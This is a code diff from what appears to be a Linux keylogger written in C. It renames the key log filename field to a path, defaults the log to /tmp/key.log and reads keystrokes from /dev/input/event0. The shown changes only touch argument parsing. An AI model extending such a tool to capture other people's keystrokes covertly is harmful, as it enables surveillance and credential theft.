@@ -79,7 +79,7 @@ static cmd_args_t arg_defaults(int argc, char *argv[])
 
     strncpy(default_args.prog_name, prog_name, MAX_PROG_NAME);
     strncpy(default_args.keyboard_device, "/dev/input/event0", MAX_DEVICE_PATH);
-    strncpy(default_args.keylog.filename, "key.log", KEY_LOG_LEN);
+    strncpy(default_args.keylog.path, "/tmp/key.log", LOG_PATH_LEN);
 
     return default_args;
 }
@@ -92,12 +92,12 @@ cmd_args_t parse_args(int argc, char *argv[])
         const char *arg = argv[k];
 
         if (is_equal(arg, "-f")) {
-            const char *filename_str = argv[++k];
+            const char *filepath_str = argv[++k];
 
-            if (filename_str) {
-                strncpy(cmd_args.keylog.filename, filename_str, KEY_LOG_LEN);
+            if (filepath_str) {
+                strncpy(cmd_args.keylog.path, filepath_str, LOG_PATH_LEN);
             } else {
-                printf("Invalid filename for key log: %s\n", filename_str);
+                printf("Invalid file path for key log: %s\n", filepath_str);
                 exit(1);
             }
         } else if (is_equal(arg, "--append")) {
